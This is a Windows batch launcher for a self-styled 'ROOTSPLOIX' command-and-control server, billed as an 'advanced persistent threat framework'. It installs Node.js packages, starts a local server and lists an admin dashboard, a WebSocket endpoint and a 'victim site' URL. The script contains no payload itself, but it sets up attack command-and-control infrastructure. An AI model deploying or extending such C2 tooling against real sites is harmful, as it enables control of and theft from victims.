@echo off
echo.
echo  ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗ ██╗      ██████╗ ██╗██╗  ██╗
echo  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗██║     ██╔═══██╗██║╚██╗██╔╝
echo  ██████╔╝██║   ██║██║   ██║   ██║   ███████╗██████╔╝██║     ██║   ██║██║ ╚███╔╝ 
echo  ██╔══██╗██║   ██║██║   ██║   ██║   ╚════██║██╔═══╝ ██║     ██║   ██║██║ ██╔██╗ 
echo  ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████║██║     ███████╗╚██████╔╝██║██╔╝ ██╗
echo  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝
echo.                                                                                   
echo  🔥 ROOTSPLOIX C2 COMMAND & CONTROL CENTER 💀
echo  Advanced Persistent Threat Framework
echo.
echo [INFO] Starting C2 Server Infrastructure...
echo.

REM Check if Node.js is installed
node --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Node.js not found! Please install Node.js first.
    echo [INFO] Download from: https://nodejs.org/
    pause
    exit /b 1
)

echo [OK] Node.js detected
echo.

REM Navigate to C2 server directory
cd c2-server

REM Check if dependencies are installed
if not exist "node_modules\" (
    echo [INFO] Installing dependencies...
    npm install express ws
    echo.
)

echo [INFO] Dependencies ready
echo [INFO] Starting C2 Server on port 8080...
echo.
echo 🌐 Admin Dashboard: http://localhost:8080
echo 📡 WebSocket Endpoint: ws://localhost:8080
echo 🎯 Victim Site: https://rootsploix.github.io/security-research-tools/
echo.
echo [WARNING] FOR AUTHORIZED TESTING ONLY!
echo.

REM Start the C2 server
node server.js

pause